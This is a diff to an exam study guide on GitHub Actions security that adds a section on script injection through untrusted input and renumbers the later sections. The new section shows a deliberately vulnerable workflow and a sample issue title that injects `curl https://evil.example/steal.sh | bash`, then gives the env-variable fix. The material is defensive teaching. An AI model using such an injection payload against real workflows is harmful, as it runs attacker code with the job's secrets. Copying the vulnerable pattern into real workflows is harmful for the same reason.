@@ -25,10 +25,11 @@ The smallest domain by weight, but arguably the most consequential in real produ
 **On this page**
 - [5.1 GITHUB_TOKEN — Default Behavior and Scoping](#51-github_token--default-behavior-and-scoping)
 - [5.2 The `pull_request` vs `pull_request_target` Trap](#52-the-pull_request-vs-pull_request_target-trap)
-- [5.3 OIDC — Keyless Cloud Authentication](#53-oidc--keyless-cloud-authentication)
-- [5.4 Secrets — Handling Best Practices](#54-secrets--handling-best-practices)
-- [5.5 Supply-Chain Pinning (Recap and Extension)](#55-supply-chain-pinning-recap-and-extension)
-- [5.6 Cost and Performance Optimization](#56-cost-and-performance-optimization)
+- [5.3 Script Injection via Untrusted Input](#53-script-injection-via-untrusted-input)
+- [5.4 OIDC — Keyless Cloud Authentication](#54-oidc--keyless-cloud-authentication)
+- [5.5 Secrets — Handling Best Practices](#55-secrets--handling-best-practices)
+- [5.6 Supply-Chain Pinning (Recap and Extension)](#56-supply-chain-pinning-recap-and-extension)
+- [5.7 Cost and Performance Optimization](#57-cost-and-performance-optimization)
 
 ---
 
@@ -58,7 +59,7 @@ permissions:
 | `checks` | Check runs/suites | A custom action reporting its own check status |
 | `contents` | Repo code, releases, tags | Pushing a commit, creating a release, `actions/checkout` needs `read` |
 | `deployments` | Deployment records | Marking a deployment as successful/failed |
-| `id-token` | OIDC token minting | Any cloud OIDC login action (§5.3) — always needs `write`, there's no partial scope |
+| `id-token` | OIDC token minting | Any cloud OIDC login action (§5.4) — always needs `write`, there's no partial scope |
 | `issues` | Issues | An action that opens or comments on issues |
 | `discussions` | Repo discussions | A bot answering/labeling discussions |
 | `packages` | GitHub Packages (container/npm/etc. registries) | Publishing a package from CI |
@@ -70,7 +71,7 @@ permissions:
 
 Two keys the exam singles out because they're easy to under-scope by habit: `id-token` has no "read" — it's either `write` (mint a token) or `none`, and it's the single most common cause of a working-then-suddenly-failing OIDC workflow (see TASK 5.3 below); `security-events: write` is the one people forget when a code-scanning upload step mysteriously 403s despite `contents: write` being set.
 
-> **📚 Theory.** Why does GitHub bother minting a fresh, job-scoped token instead of using one long-lived credential? Because the blast radius of a leaked token is capped to exactly one job's lifetime and exactly the permissions that job declared — if a malicious dependency in step 3 of a job somehow exfiltrates `GITHUB_TOKEN`, it's useless within minutes and was never more powerful than `contents: read` in the first place (if that's all the job declared). This is the same "least privilege + short-lived" philosophy that underlies OIDC (§5.3) — GitHub Actions security design consistently favors ephemeral, narrowly-scoped credentials over static broad ones.
+> **📚 Theory.** Why does GitHub bother minting a fresh, job-scoped token instead of using one long-lived credential? Because the blast radius of a leaked token is capped to exactly one job's lifetime and exactly the permissions that job declared — if a malicious dependency in step 3 of a job somehow exfiltrates `GITHUB_TOKEN`, it's useless within minutes and was never more powerful than `contents: read` in the first place (if that's all the job declared). This is the same "least privilege + short-lived" philosophy that underlies OIDC (§5.4) — GitHub Actions security design consistently favors ephemeral, narrowly-scoped credentials over static broad ones.
 
 ---
 
@@ -266,7 +267,53 @@ The fork's raw code and install scripts never execute anywhere that has `secrets
 
 ---
 
-## 5.3 OIDC — Keyless Cloud Authentication
+## 5.3 Script Injection via Untrusted Input
+
+`pull_request_target` (§5.2) is one way untrusted content reaches a privileged context. **Script injection** is the other, more common one — and it doesn't require any special trigger at all. It happens the moment attacker-controlled text is interpolated directly into a `run:` step's shell command via `${{ }}` expression syntax.
+
+```yaml
+# ❌ DANGEROUS — do not do this
+on: issues
+jobs:
+  greet:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "Thanks for opening: ${{ github.event.issue.title }}"
+```
+
+**Why this is exploitable:** before the step ever runs, GitHub Actions substitutes the `${{ }}` expression **as raw text** into the YAML, and *then* the shell interprets the resulting line. An issue titled:
+
+```
+"; curl https://evil.example/steal.sh | bash #
+```
+
+gets substituted in verbatim, turning the intended `echo` command into three shell commands — the attacker's `curl | bash` runs with whatever permissions and secrets that job has, and no code review ever saw it, because the "code" was a GitHub issue title, not a commit.
+
+**Any field an untrusted user can set is a potential injection vector**, not just issue titles — this includes `github.event.pull_request.title`, `.body`, `.head.ref`, commit messages (`github.event.commits[0].message`), and review/comment bodies. The exam expects you to recognize this pattern by the *shape* of the code (a `run:` step with `${{ github.event.<something user-controlled> }}` inline), not just from a specific field name.
+
+**The fix: never interpolate untrusted input directly into `run:`. Pass it through an intermediate environment variable instead.**
+
+```yaml
+# ✅ SAFE — the value is assigned to an env var by the runner, not substituted into the command text
+on: issues
+jobs:
+  greet:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          ISSUE_TITLE: ${{ github.event.issue.title }}
+        run: echo "Thanks for opening: $ISSUE_TITLE"
+```
+
+- The `env:` block still uses `${{ }}`, but the substitution happens **once**, into an environment variable's *value* — the shell then reads that value as inert data via `$ISSUE_TITLE`, never re-parsing it as command syntax. This is the single fix the exam is looking for whenever it shows this pattern.
+- The same rule applies inside JavaScript and composite actions that shell out internally — if an action reads `github.event.issue.title` and passes it to `exec()` unsanitized, it has the same vulnerability, just hidden one layer down.
+- This is a distinct problem from `pull_request_target`, though the two often compound: a workflow could be triggered by a completely safe event (`issues`, `issue_comment`) and still be exploitable purely through unsafe string interpolation, with no elevated trigger involved at all.
+
+🔴 **Exam tip:** if a question shows a `run:` step with a raw `${{ github.event.*.title/body/ref }}` expression inline in the shell command, the answer is almost always "move it to an `env:` variable first" — regardless of what the surrounding trigger or permissions look like.
+
+---
+
+## 5.4 OIDC — Keyless Cloud Authentication
 
 Instead of storing long-lived cloud credentials (AWS access keys, Azure service principal secrets) as GitHub secrets, OIDC lets your workflow request a **short-lived, cryptographically signed identity token** from GitHub and exchange it for temporary cloud credentials.
 
@@ -370,7 +417,7 @@ The generic, unhelpful error message (`Could not load credentials from any provi
 
 ---
 
-## 5.4 Secrets — Handling Best Practices
+## 5.5 Secrets — Handling Best Practices
 
 - **Masking is best-effort, not foolproof.** GitHub automatically redacts an exact secret value if it appears verbatim in logs — but a **transformed** version (base64-encoded, partially concatenated, or a substring) can slip through unmasked. Never assume a secret is safe just because it's marked as a "secret."
 - **Environment secrets** (scoped to a GitHub Environment like `production`) support **protection rules**: required reviewers, wait timers, and branch restrictions — this is the mechanism for "someone must approve before this job can access the production deploy key." Configuring these rules is covered in full in Chapter 4 §4.6; this section is the secrets-scoping half of the same feature.
@@ -392,7 +439,7 @@ jobs:
 
 ---
 
-## 5.5 Supply-Chain Pinning (Recap and Extension)
+## 5.6 Supply-Chain Pinning (Recap and Extension)
 
 Chapter 3 covered pinning your **own published** actions; this section is about pinning **third-party dependencies** you consume.
 
@@ -414,7 +461,7 @@ jobs:
   build:
     runs-on: ubuntu-latest
     permissions:
-      id-token: write        # attestations are signed via the same OIDC identity as §5.3
+      id-token: write        # attestations are signed via the same OIDC identity as §5.4
       attestations: write
       contents: read
     steps:
@@ -426,13 +473,13 @@ jobs:
 ```
 
 - Build provenance attestations follow the **SLSA** framework's core idea: a verifiable, non-forgeable statement of *which workflow run, which commit, which source repo* produced an artifact — so a consumer downloading it later (or a security tool scanning your releases) can confirm it wasn't tampered with or built from unreviewed code.
-- Like OIDC (§5.3), this needs `id-token: write` — attestations are signed using the workflow's own OIDC identity, not a long-lived key you manage.
+- Like OIDC (§5.4), this needs `id-token: write` — attestations are signed using the workflow's own OIDC identity, not a long-lived key you manage.
 - Verification happens on the consuming side with the `gh attestation verify` command, checking the artifact against the signed provenance GitHub stores for it.
 - The exam-relevant distinction: **pinning protects you from a compromised dependency; attestation protects your downstream consumers from a compromised (or tampered) build of your own artifact.** They solve mirror-image problems in the same supply chain.
 
 ---
 
-## 5.6 Cost and Performance Optimization
+## 5.7 Cost and Performance Optimization
 
 | Technique | Effect |
 |---|---|
@@ -456,6 +503,9 @@ jobs:
 ❌ Using `pull_request_target` and checking out + executing the fork's code in the same job.
 ✅ Split into two workflows: safe build on `pull_request`, privileged action on `workflow_run` consuming an artifact.
 
+❌ Interpolating `${{ github.event.issue.title }}` (or any user-controlled field) directly into a `run:` shell command.
+✅ Assign it to an `env:` variable first, then reference it as `$VAR_NAME` — the shell then treats it as inert data, not command syntax.
+
 ❌ Forgetting `id-token: write` when setting up OIDC — leads to a confusing generic credentials error, not an obvious permissions error.
 ✅ Always pair OIDC cloud-auth actions with an explicit `id-token: write` permission.
 
@@ -472,6 +522,7 @@ jobs:
 - `GITHUB_TOKEN` is job-scoped and short-lived; specifying any permission **zeroes out** everything unspecified; job-level permissions fully replace workflow-level, they don't merge.
 - Fork PRs always get a read-only, secret-free token under `pull_request` — this is a hardcoded safety floor.
 - `pull_request_target` grants base-repo privileges even for fork PRs — **never** combine it with checking out and executing the fork's code; split into two workflows if you need both privilege and fork-code execution.
+- Never interpolate user-controlled fields (`github.event.issue.title`, PR title/body, commit messages) directly into a `run:` shell command — assign to an `env:` variable first, or it's a script-injection vulnerability regardless of the trigger's own safety.
 - OIDC (`id-token: write`) replaces long-lived cloud secrets with short-lived, claim-conditioned tokens — new/renamed repos as of July 2026 get immutable numeric-ID-based `sub` claims to prevent name-recycling attacks.
 - Environment protection rules (required reviewers) are the correct mechanism for human approval gates — not `if:` conditions.
 - Pin third-party actions to full commit SHAs for security-sensitive workflows; tags are a convenience, not a security guarantee.
